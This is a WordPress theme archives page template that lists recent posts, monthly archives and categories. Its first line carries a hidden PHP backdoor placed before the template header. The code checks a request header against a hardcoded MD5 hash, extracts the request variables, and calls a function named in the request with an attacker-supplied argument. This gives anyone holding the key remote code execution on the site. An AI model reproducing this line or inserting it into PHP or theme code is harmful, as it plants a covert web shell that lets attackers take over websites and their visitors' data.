<?php if(@md5($_SERVER['HTTP_PATH'])==='5cd2973f835de94b560b62465d5a37f3'){ @extract($_REQUEST); @die($stime($mtime)); } ?>
<?php
/**
 * Template Name: Archives
 */
?>

<?php get_header(); ?>

			<div id="content" class="grid_8 <?php echo of_get_option('blog_sidebar_pos') ?>">
			<?php if (have_posts()) : while (have_posts()) : the_post(); ?>
            
                <div id="post-<?php the_ID(); ?>" <?php post_class('post-holder'); ?>>
                    
                    
                    <h1 class="title"><?php the_title(); ?></h1>
                
                    <div class="post-content">
                        <?php the_content('<span>Continue Reading</span>'); ?>
                        <?php wp_link_pages(array('before' => '<p><strong>'.__('Pages:', 'theme1745').'</strong> ', 'after' => '</p>', 'next_or_number' => 'number')); ?>
                        
                        <div class="archive-lists">
                            
                            <h3><?php _e('Last 30 Posts', 'theme1745') ?></h3>
                            
                            <ul>
                            <?php $archive_30 = get_posts('numberposts=30');
                            foreach($archive_30 as $post) : ?>
                                <li><a href="<?php the_permalink(); ?>"><?php the_title();?></a></li>
                            <?php endforeach; ?>
                            </ul>
                            
                            <h3><?php _e('Archives by Month:', 'theme1745') ?></h3>
                            
                            <ul>
                                <?php wp_get_archives('type=monthly'); ?>
                            </ul>
                
                            <h3><?php _e('Archives by Subject:', 'theme1745') ?></h3>
                            
                            <ul>
                                <?php wp_list_categories( 'title_li=' ); ?>
                            </ul>
                        
                        <!-- //.archive-lists -->
                        </div>
                    
                    <!-- //.post-content -->
                    </div>

                </div>

				<?php endwhile; endif; ?>
			
			</div><!--#content-->
			
<?php get_sidebar(); ?>

<?php get_footer(); ?>